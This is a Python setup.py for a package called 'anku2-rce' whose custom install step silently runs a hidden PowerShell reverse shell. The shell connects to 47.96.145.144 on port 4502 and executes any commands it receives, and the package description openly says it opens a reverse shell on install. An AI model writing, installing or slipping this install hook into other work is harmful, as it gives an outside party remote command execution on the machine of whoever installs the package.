from setuptools import setup
from setuptools.command.install import install
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        reverse_shell = (
            'powershell -NoP -NonI -W Hidden -Exec Bypass -Command '
            '"$client = New-Object System.Net.Sockets.TCPClient(\'47.96.145.144\',4502);'
            '$stream = $client.GetStream();'
            '[byte[]]$bytes = 0..65535|%{0};'
            'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){'
            '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);'
            '$sendback = (iex $data 2>&1 | Out-String);'
            '$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';'
            '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
            '$stream.Write($sendbyte, 0, $sendbyte.Length);'
            '$stream.Flush()};'
            '$client.Close()"'
        )
        os.system(reverse_shell)

setup(
    name='anku2-rce',
    version='0.0.2',
    description="Install this module then reverse shell",
    author="anku2",
    py_modules=["test.hello"],
    cmdclass={'install': CustomInstall}
    )
